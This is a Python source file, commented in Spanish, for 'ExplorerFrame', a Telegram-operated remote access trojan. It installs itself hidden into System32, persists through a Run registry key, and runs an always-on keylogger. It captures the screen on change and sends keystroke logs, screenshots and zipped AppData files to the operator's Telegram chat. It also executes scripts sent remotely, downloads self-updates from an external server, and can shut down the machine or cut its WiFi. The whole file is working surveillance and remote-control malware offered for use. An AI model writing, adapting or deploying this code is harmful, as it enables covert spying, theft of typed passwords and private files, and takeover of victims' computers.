
import os
import sys
import asyncio
import threading
import subprocess
import ctypes
import platform
import shutil
from datetime import datetime
from pathlib import Path
from io import BytesIO
import tempfile
import zipfile

if platform.system() == "Windows":
    import PIL.ImageGrab
from PIL import Image
if platform.system() == "Windows":
    import keyboard
    import win32event
    import win32api
    import winerror
    import winreg
import psutil
import requests
import numpy as np
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode
import pytz
import tzlocal

from core import (
    ensure_deps, BOT_TOKEN, API_URL, OWNER_ID, APPDATA, SYSTEM32, EXE_NAME, EXE_PATH, KEYLOG_FILE, TEMP_DIR,
    BACKUP_INTERVAL, SCREENSHOT_CHECK_INTERVAL, AUDIO_INTERVAL, METRICS_INTERVAL, KEYLOG_SEND_INTERVAL,
    UPDATE_CHECK_INTERVAL, authorized_users, authorized_groups, last_screenshot, user_file_registry,
    navigation_state, update_token, fetch_authorized_ids, is_authorized, format_size, get_file_hash,
    load_user_registry, save_user_registry, update_file_registry, get_system_info
)

# =============================================================================
# AUTOINSTALACIÓN Y ACTUALIZACIONES
# =============================================================================
async def check_for_updates_job(context: ContextTypes.DEFAULT_TYPE):
    """Consulta el servidor si hay nueva versión disponible (job_queue compatible)."""
    update_token = os.environ.get("UPDATE_TOKEN")
    try:
        resp = requests.get(f"{API_URL}/api/v1/download/status", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("available"):
                if not update_token:
                    print("No hay token de actualización")
                    return
                token_resp = requests.post(
                    f"{API_URL}/api/v1/download/token",
                    headers={"X-API-Key": update_token},
                    json={"expires_minutes": 10},
                    timeout=10
                )
                if token_resp.status_code == 200:
                    token_data = token_resp.json()
                    download_url = token_data.get("download_url")
                    if download_url:
                        new_exe = requests.get(download_url, timeout=30)
                        if new_exe.status_code == 200:
                            temp_exe = os.path.join(TEMP_DIR, "update.exe")
                            with open(temp_exe, 'wb') as f:
                                f.write(new_exe.content)
                            if os.path.exists(EXE_PATH):
                                os.remove(EXE_PATH)
                            shutil.move(temp_exe, EXE_PATH)
                            if platform.system() == "Windows":
                                ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
                            print("✅ Actualización descargada. Reiniciando...")
                            subprocess.Popen([EXE_PATH], creationflags=subprocess.CREATE_NO_WINDOW)
                            sys.exit(0)
    except Exception as e:
        print(f"Error en actualización: {e}")

def auto_install():
    """Instalación automática en System32 si es ejecutable compilado."""
    if not getattr(sys, 'frozen', False):
        return
    if platform.system() != "Windows":
        return # Auto-install solo para Windows
    if os.path.exists(EXE_PATH) and os.path.samefile(sys.executable, EXE_PATH):
        return  # ya está instalado
    if not ctypes.windll.shell32.IsUserAnAdmin():
        # Relanzar como administrador
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    try:
        shutil.copy2(sys.executable, EXE_PATH)
        # Ocultar archivo
        ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
        # Añadir al inicio
        reg_key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        os.system(f'reg add "{reg_key}" /v "ExplorerFrame" /t REG_SZ /d "{EXE_PATH}" /f')
        # Anclar a la barra de tareas (requiere PowerShell)
        ps_script = f"""
        $shell = New-Object -ComObject Shell.Application
        $folder = $shell.Namespace(\'{SYSTEM32}\')
        $item = $folder.ParseName(\'{EXE_NAME}\')
        $item.InvokeVerb(\'taskbarpin\')
        """
        subprocess.run(['powershell', '-Command', ps_script], creationflags=subprocess.CREATE_NO_WINDOW)
        # Ejecutar nueva copia y salir
        subprocess.Popen([EXE_PATH] + sys.argv[1:], creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except Exception as e:
        print(f"Error en autoinstalación: {e}")
        sys.exit(1)

# =============================================================================
# TAREAS PROGRAMADAS
# =============================================================================
async def auto_backup(context: ContextTypes.DEFAULT_TYPE):
    """Realiza un backup automático de archivos modificados."""
    global user_file_registry
    # Implementación de backup (se mantiene en render.py ya que interactúa con el bot)
    # ... (código de auto_backup de explorerframe.py)
    modified_files = []
    for root, _, files in os.walk(APPDATA):
        for file in files:
            path = os.path.join(root, file)
            if path.startswith(TEMP_DIR):
                continue # Ignorar archivos temporales
            current_hash = get_file_hash(path)
            if user_file_registry.get(path) != current_hash:
                modified_files.append(path)
                update_file_registry(path, current_hash)

    if not modified_files:
        return

    # Crear zip
    zip_path = os.path.join(TEMP_DIR, f"backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for f in modified_files:
            try:
                zf.write(f, os.path.relpath(f, APPDATA))
            except:
                continue
    # Enviar a todos los usuarios autorizados (o al primero)
    for uid in authorized_users:
        try:
            with open(zip_path, 'rb') as fd:
                await context.bot.send_document(
                    chat_id=uid,
                    document=fd,
                    filename=os.path.basename(zip_path),
                    caption=f"📦 Backup automático: {len(modified_files)} archivos nuevos"
                )
            break  # enviar solo a uno por ahora
        except:
            continue
    os.remove(zip_path)

# =============================================================================
# CAPTURA DE PANTALLA POR CAMBIOS (sin OpenCV)
# =============================================================================
def capture_screen():
    """Captura la pantalla completa y devuelve como numpy array (RGB)."""
    if platform.system() == "Windows":
        img = PIL.ImageGrab.grab()
        return np.array(img)  # RGB directo
    return np.zeros((100, 100, 3), dtype=np.uint8)  # Dummy image for non-Windows

def images_different(img1, img2, threshold=0.05):
    """Compara dos imágenes (numpy arrays) y devuelve True si son diferentes."""
    if img1 is None or img2 is None:
        return True
    # Convertir a PIL para redimensionar
    h, w = img1.shape[:2]
    # Redimensionar a 100x100 para comparación rápida
    img1_pil = Image.fromarray(img1)
    img2_pil = Image.fromarray(img2)
    img1_small = np.array(img1_pil.resize((100, 100), Image.Resampling.LANCZOS))
    img2_small = np.array(img2_pil.resize((100, 100), Image.Resampling.LANCZOS))
    # Diferencia absoluta
    diff = np.abs(img1_small.astype(np.float32) - img2_small.astype(np.float32))
    gray = np.mean(diff, axis=2)  # promedio de canales (simula escala de grises)
    non_zero = np.count_nonzero(gray > 30)
    total = gray.size
    return (non_zero / total) > threshold

async def check_screen_changes(context: ContextTypes.DEFAULT_TYPE):
    """Revisa si la pantalla cambió y envía captura."""
    global last_screenshot
    loop = asyncio.get_event_loop()
    current = await loop.run_in_executor(None, capture_screen)
    if last_screenshot is None:
        last_screenshot = current
        return
    if images_different(last_screenshot, current):
        # Guardar imagen
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        img_path = os.path.join(TEMP_DIR, f"change_{timestamp}.png")
        Image.fromarray(current).save(img_path)
        last_screenshot = current
        # Enviar
        for uid in authorized_users:
            try:
                with open(img_path, 'rb') as fd:
                    await context.bot.send_photo(chat_id=uid, photo=fd, caption="📸 Cambio detectado en pantalla")
                break
            except:
                continue
        os.remove(img_path)

# =============================================================================
# KEYLOGGER (siempre activo, envía cada 10 min)
# =============================================================================
keylog_active = True
def keylogger_callback(e):
    if not keylog_active:
        return
    with open(KEYLOG_FILE, 'a', encoding='utf-8') as f:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        n = e.name
        if n == 'space':
            k = ' '
        elif n == 'enter':
            k = '\n'
        elif n == 'backspace':
            k = '[BORRAR]'
        elif len(n) == 1:
            k = n
        else:
            k = f'[{n.upper()}]'
        f.write(f"{ts}: {k}\n")

if platform.system() == "Windows":
    keyboard.on_press(keylogger_callback)

async def send_keylog(context: ContextTypes.DEFAULT_TYPE):
    """Envía el archivo de keylog y lo limpia solo si el envío fue exitoso."""
    if not os.path.exists(KEYLOG_FILE):
        return
    sent = False
    with open(KEYLOG_FILE, 'rb') as f:
        for uid in authorized_users:
            try:
                await context.bot.send_document(chat_id=uid, document=f, filename='keylog.txt', caption="⌨️ Log de teclas")
                sent = True
                break
            except:
                continue
    if sent:
        open(KEYLOG_FILE, 'w').close()

# =============================================================================
# COMANDOS DE CONTROL DEL SISTEMA (workstation, wifi)
# =============================================================================
async def workstation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Controla estados de la estación de trabajo."""
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Uso: /workstation mode: lockscreen/shutdown/logout/restart/suspend/hibernate")
        return
    mode = args[0].lower().replace('mode:', '').strip()
    try:
        if mode == 'lockscreen':
            if platform.system() == "Windows":
                ctypes.windll.user32.LockWorkStation()
            else:
                subprocess.run(["xdg-screensaver", "lock"])
            await update.message.reply_text("🔒 Pantalla bloqueada")
        elif mode == 'shutdown':
            if platform.system() == "Windows":
                os.system('shutdown /s /t 5')
            else:
                os.system('sudo shutdown -h +1')
            await update.message.reply_text("💻 Apagando en 5 segundos")
        elif mode == 'logout':
            if platform.system() == "Windows":
                os.system('shutdown /l')
            else:
                os.system('gnome-session-quit --logout --no-prompt') # Ejemplo para GNOME
            await update.message.reply_text("👋 Cerrando sesión")
        elif mode == 'restart':
            if platform.system() == "Windows":
                os.system('shutdown /r /t 5')
            else:
                os.system('sudo shutdown -r +1')
            await update.message.reply_text("🔄 Reiniciando en 5 segundos")
        elif mode == 'suspend':
            if platform.system() == "Windows":
                os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
            else:
                subprocess.run(["systemctl", "suspend"])
            await update.message.reply_text("💤 Suspender")
        elif mode == 'hibernate':
            if platform.system() == "Windows":
                os.system('shutdown /h')
            else:
                subprocess.run(["systemctl", "hibernate"])
            await update.message.reply_text("💤 Hibernando")
        else:
            await update.message.reply_text("Modo no reconocido")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def wifi_off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Apaga el WiFi y monitorea conectividad."""
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    try:
        if platform.system() == "Windows":
            subprocess.run('netsh interface set interface "Wi-Fi" admin=disable', shell=True, capture_output=True)
        else:
            subprocess.run(['nmcli', 'radio', 'wifi', 'off'])
        await update.message.reply_text("📡 WiFi apagado. Esperando conexión...")
        asyncio.create_task(monitor_wifi(update.effective_chat.id, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def monitor_wifi(chat_id, context):
    """Monitorea hasta que haya conexión a internet."""
    while True:
        try:
            requests.get('https://www.google.com', timeout=5)
            if platform.system() == "Windows":
                subprocess.run('netsh interface set interface "Wi-Fi" admin=enable', shell=True)
            else:
                subprocess.run(['nmcli', 'radio', 'wifi', 'on'])
            await context.bot.send_message(chat_id=chat_id, text="✅ Conexión a internet restablecida")
            break
        except:
            await asyncio.sleep(10)

# =============================================================================
# MANEJO DE ARCHIVOS RECIBIDOS (scripts, parches)
# =============================================================================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    doc = update.message.document
    file_name = doc.file_name
    await update.message.reply_text(f"📥 Recibiendo: {file_name}")
    file = await doc.get_file()
    save_path = os.path.join(APPDATA, file_name)
    await file.download_to_drive(save_path)
    await update.message.reply_text(f"✅ Guardado en: {save_path}")

    # Si es un parche (patch.zip), reemplaza el ejecutable
    if file_name.lower() == 'patch.zip':
        await update.message.reply_text("🔄 Aplicando parche...")
        try:
            with zipfile.ZipFile(save_path, 'r') as zf:
                for name in zf.namelist():
                    if name.endswith('.exe') or (platform.system() != "Windows" and not os.path.splitext(name)[1]): # Para Linux, puede que no tenga extensión .exe
                        with tempfile.NamedTemporaryFile(delete=False, suffix='.exe' if platform.system() == "Windows" else '') as tmp:
                            with zf.open(name) as source, open(tmp.name, 'wb') as target:
                                shutil.copyfileobj(source, target)
                            if os.path.exists(EXE_PATH):
                                os.remove(EXE_PATH)
                            shutil.move(tmp.name, EXE_PATH)
                            if platform.system() == "Windows":
                                ctypes.windll.kernel32.SetFileAttributesW(EXE_PATH, 2+4)
                            else:
                                os.chmod(EXE_PATH, 0o755) # Dar permisos de ejecución en Linux
                            await update.message.reply_text("✅ Parche aplicado. Reinicia el bot.")
                            subprocess.Popen([EXE_PATH], creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
                            sys.exit(0)
                        break
                else:
                    await update.message.reply_text("No se encontró un ejecutable en el zip.")
        except Exception as e:
            await update.message.reply_text(f"Error al aplicar parche: {e}")
        finally:
            os.remove(save_path)
    # Si es un script, preguntar si ejecutar
    elif file_name.endswith(('.py', '.bat', '.ps1', '.cmd', '.sh')):
        await update.message.reply_text(f"¿Ejecutar {file_name}? (responde sí/no)")
        context.user_data['pending_script'] = save_path

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    text = update.message.text.lower()
    if 'pending_script' in context.user_data:
        if text in ['sí', 'si', 'yes', 's']:
            script_path = context.user_data['pending_script']
            ext = os.path.splitext(script_path)[1].lower()
            await update.message.reply_text("⚙️ Ejecutando...")
            try:
                if ext == '.py':
                    result = subprocess.run([sys.executable, script_path], capture_output=True, text=True, timeout=30)
                elif ext == '.bat' or ext == '.cmd':
                    result = subprocess.run(['cmd', '/c', script_path], capture_output=True, text=True, timeout=30)
                elif ext == '.ps1':
                    result = subprocess.run(['powershell', '-File', script_path], capture_output=True, text=True, timeout=30)
                elif ext == '.sh':
                    result = subprocess.run(['bash', script_path], capture_output=True, text=True, timeout=30)
                else:
                    result = None
                if result:
                    output = result.stdout + result.stderr
                    await update.message.reply_text(f"```\n{output[:3000]}\n```", parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await update.message.reply_text(f"Error: {e}")
            del context.user_data['pending_script']
        else:
            await update.message.reply_text("Ejecución cancelada")
            del context.user_data['pending_script']

# =============================================================================
# EXPLORADOR DE CARPETAS CON BOTONES
# =============================================================================
def get_folder_contents(path):
    """Devuelve lista de subcarpetas y archivos en una ruta."""
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        return folders, files
    except:
        return [], []

def build_navigation_keyboard(path, page=0):
    """Construye teclado inline para navegación de carpetas (20 items por página)."""
    folders, files = get_folder_contents(path)
    all_items = folders + files
    total = len(all_items)
    start = page * 20
    end = min(start + 20, total)
    page_items = all_items[start:end]

    keyboard = []
    for item in page_items:
        keyboard.append([InlineKeyboardButton(item, callback_data=f"nav|{path}|{item}")])

    # Botones de navegación
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️", callback_data=f"navpage|{path}|{page-1}"))
    else:
        nav_row.append(InlineKeyboardButton("⬅️", callback_data="noop"))
    nav_row.append(InlineKeyboardButton("📁", callback_data=f"navselect|{path}"))
    nav_row.append(InlineKeyboardButton("➡️", callback_data=f"navpage|{path}|{page+1}"))
    keyboard.append(nav_row)

    # Botón para subir
    parent = os.path.dirname(path)
    if parent and parent != path:
        keyboard.append([InlineKeyboardButton("⬆️ Subir", callback_data=f"nav|{parent}|..")])

    return InlineKeyboardMarkup(keyboard)

async def handle_navigation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    parts = data.split('|')
    action = parts[0]

    if action == 'nav':
        path = parts[1]
        item = parts[2]
        new_path = os.path.join(path, item)
        if os.path.isdir(new_path):
            # Entrar a carpeta
            await query.edit_message_text(f"📂 {new_path}", reply_markup=build_navigation_keyboard(new_path))
        else:
            # Es archivo, preguntar qué hacer
            await query.edit_message_text(f"📄 {item}\n¿Descargar? (usa /download)")
            context.user_data['selected_file'] = new_path
    elif action == 'navpage':
        path = parts[1]
        page = int(parts[2])
        await query.edit_message_text(f"📂 {path}", reply_markup=build_navigation_keyboard(path, page))
    elif action == 'navselect':
        path = parts[1]
        # Seleccionar carpeta actual (se puede usar para backup, etc.)
        await query.edit_message_text(f"✅ Carpeta seleccionada: {path}")
        context.user_data['selected_folder'] = path

async def cd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /cd para iniciar exploración."""
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    user_id = update.effective_user.id
    start_path = os.path.expanduser("~")  # Inicio en home del usuario
    await update.message.reply_text(f"📂 {start_path}", reply_markup=build_navigation_keyboard(start_path))

# =============================================================================
# COMANDOS MANUALES
# =============================================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        await update.message.reply_text("No autorizado")
        return
    # Enviar info solo la primera vez
    if 'first_run_done' not in context.user_data:
        context.user_data['first_run_done'] = True
        local_ip, public_ip, location = "", "", ""
        sysinfo = await get_system_info()
        msg = (
            f"🆕 *Primera ejecución*\n\n"
            f"🌐 *IP Local:* {local_ip}\n"
            f"🌍 *IP Pública:* {public_ip}\n"
            f"📍 *Ubicación:* {location}\n\n"
            f"{sysinfo}"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

    help_text = (
        "🤖 *ExplorerFrame - Ayuda*\n\n"
        "Comandos disponibles:\n"
        "/cd - Explorador de carpetas\n"
        "/download [ruta] - Descargar archivo\n"
        "/screenshot - Captura manual\n"
        "/info - Información del sistema\n"
        "/workstation mode: lockscreen/shutdown/logout/restart/suspend/hibernate\n"
        "/wifi off - Apagar WiFi y esperar conexión\n"
        "/help - Este mensaje\n\n"
        "También puedes enviar archivos (scripts, parches) y serán ejecutados."
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    if context.args:
        file_path = " ".join(context.args)
    elif 'selected_file' in context.user_data:
        file_path = context.user_data['selected_file']
    else:
        await update.message.reply_text("Uso: /download <ruta> o selecciona un archivo con /cd")
        return
    if os.path.isfile(file_path):
        with open(file_path, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(file_path))
    else:
        await update.message.reply_text("Archivo no encontrado")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    sysinfo = await get_system_info()
    await update.message.reply_text(sysinfo, parse_mode=ParseMode.MARKDOWN)

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update):
        return
    await update.message.reply_text("📸 Capturando...")
    img = await asyncio.get_event_loop().run_in_executor(None, capture_screen)
    img_path = os.path.join(TEMP_DIR, f"manual_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
    Image.fromarray(img).save(img_path)
    with open(img_path, 'rb') as f:
        await update.message.reply_photo(photo=f)
    os.remove(img_path)

# =============================================================================
# INICIALIZACIÓN Y TAREAS PROGRAMADAS
# =============================================================================
async def post_init(application: Application):
    """Se ejecuta después de inicializar el bot."""
    load_user_registry()
    await fetch_authorized_ids()
    jq = application.job_queue
    if jq:
        jq.run_repeating(auto_backup, interval=BACKUP_INTERVAL, first=10, name='backup')
        jq.run_repeating(check_screen_changes, interval=SCREENSHOT_CHECK_INTERVAL, first=5, name='screenshot_check')
        jq.run_repeating(send_keylog, interval=KEYLOG_SEND_INTERVAL, first=KEYLOG_SEND_INTERVAL, name='keylog')
        jq.run_repeating(check_for_updates_job, interval=UPDATE_CHECK_INTERVAL, first=30, name='updates')
    if not authorized_users:
        print("ADVERTENCIA: authorized_users está vacío al iniciar. Define OWNER_ID o AUTHORIZED_IDS.")
    for uid in authorized_users:
        try:
            await application.bot.send_message(chat_id=uid, text="🟢 *ExplorerFrame iniciado*", parse_mode=ParseMode.MARKDOWN)
        except:
            pass

def run_bot():
    if BOT_TOKEN is None:
        print("Error: BOT_TOKEN no está configurado. Asegúrate de que la variable de entorno BOT_TOKEN esté definida.")
        sys.exit(1)
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cd", cd_command))
    app.add_handler(CommandHandler("download", download))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("workstation", workstation))
    app.add_handler(CommandHandler("wifi", wifi_off))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_navigation))
    print("🚀 Bot ExplorerFrame iniciado. Ctrl+C para detener.")
    import asyncio
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Usar stop_signals=None para evitar el error de set_wakeup_fd en hilos
    app.run_polling(stop_signals=None)

# =============================================================================
# FUNCIONES PARA CREAR CARPETA CON ICONO (contexto menu)
# =============================================================================

def create_folder_with_icon():
    """Crea una carpeta con el icono de ExplorerFrame en el escritorio."""
    if platform.system() != "Windows":
        print("Esta función es solo para Windows.")
        return False
    try:
        desktop = Path.home() / "Desktop"
        if not desktop.exists():
            desktop = Path.home() / "Documents"
        
        folder_name = "Nueva carpeta"
        folder_path = desktop / folder_name
        counter = 1
        while folder_path.exists():
            folder_path = desktop / f"{folder_name} ({counter})"
            counter += 1
        
        folder_path.mkdir(parents=True, exist_ok=True)
        
        icon_path = Path(__file__).parent / "app" / "app-icon.ico"
        if icon_path.exists():
            desktop_ini = folder_path / "desktop.ini"
            with open(desktop_ini, 'w') as f:
                f.write("[.ShellClassInfo]\n")
                f.write(f"IconResource={icon_path},0\n")
            
            ctypes.windll.kernel32.SetFileAttributesW(str(desktop_ini), 2)
            ctypes.windll.kernel32.SetFileAttributesW(str(folder_path), 4)
        
        print(f"✅ Carpeta creada: {folder_path}")
        subprocess.Popen(f'explorer /select,"{folder_path}"')
        return True
    except Exception as e:
        print(f"❌ Error creando carpeta: {e}")
        return False

def open_file_explorer():
    """Abre el explorador de archivos para ocultar la ejecución."""
    if platform.system() == "Windows":
        try:
            subprocess.Popen("explorer.exe", creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            print(f"❌ Error abriendo explorador: {e}")
    else:
        print("Esta función es solo para Windows.")


from flask import Flask
app = Flask(__name__)

@app.route('/')
def health_check():
    return "ExplorerFrame is running!", 200

if __name__ == "__main__":
    # Iniciar el bot en un hilo separado si se ejecuta directamente
    import threading
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Iniciar el servidor Flask para Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
